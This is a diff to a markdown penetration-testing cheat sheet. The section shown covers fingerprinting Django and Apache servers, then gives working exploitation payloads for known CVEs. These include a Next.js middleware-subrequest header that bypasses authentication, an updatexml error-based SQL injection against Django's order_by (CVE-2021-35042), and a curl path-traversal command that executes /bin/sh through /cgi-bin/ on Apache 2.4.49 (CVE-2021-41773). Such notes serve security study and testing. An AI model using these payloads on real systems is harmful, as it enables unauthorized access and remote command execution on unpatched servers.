@@ -102,12 +102,8 @@ curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:mi
 **Result:** Access protected routes (e.g., `/dashboard`) without login.
 
 
-Here is the **short note** for Django and CVE-2021-35042 – only what you need to know.
+### Django
 
-
-## Django
-
-### Fingerprinting Django
 - **`Server: WSGIServer/0.2 CPython/...`** header  
 - **`csrftoken`** cookie  
 - **`X-Frame-Options: DENY`** + **`X-Content-Type-Options: nosniff`** together  
@@ -115,7 +111,7 @@ Here is the **short note** for Django and CVE-2021-35042 – only what you need 
 - Admin panel at `/admin/` (enabled by default)
 
 
-### CVE-2021-35042 – SQL Injection in `order_by()` (CVSS 9.8 Critical)
+#### CVE-2021-35042 – SQL Injection in `order_by()` (CVSS 9.8 Critical)
 
 **What it is:**  
 Django’s `order_by()` method concatenates user input directly into an `ORDER BY` clause when developers bypass the ORM and write raw SQL.
@@ -138,4 +134,33 @@ Use `updatexml()` to leak data via error messages.
 2. Get database name:  
    `?order=updatexml(1,concat(0x7e,(select database())),1)`
 
+
+
+
+### LAMP Stack – Short Note
+
+- **`Server: Apache/2.4.49 (Unix)`** header  
+- **404 error page footer** also shows version  
+- **`/cgi-bin/`** returns **403 Forbidden** (not 404) → confirms `mod_cgi` is enabled
+
+> Exact version 2.4.49 is vulnerable to CVE-2021-41773. 2.4.50 has a partial patch (bypassable via double encoding – CVE-2021-42013). 2.4.51+ patched.
+
+
+#### CVE-2021-41773 – Path Traversal to RCE
+
+**What it is:**  
+Apache 2.4.49 flawed path normalization: `.%2e/` bypasses the `../` filter. When combined with `mod_cgi` on `/cgi-bin/`, you can execute arbitrary system commands.
+
+**Why `--path-as-is` is required:**  
+`curl` normalizes URLs by default (removes `.%2e/`). The flag forces curl to send the exact encoded path.
+
+**Exploitation payload:**
+```bash
+curl -s --path-as-is "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; <command>'
+```
+
+**Breakdown:**
+- `/.%2e/.%2e/.%2e/.%2e/` = traverse up 4 directories to filesystem root
+- `/bin/sh` = execute shell
+- POST body must include `echo Content-Type: text/plain; echo;` (CGI header requirement)
 
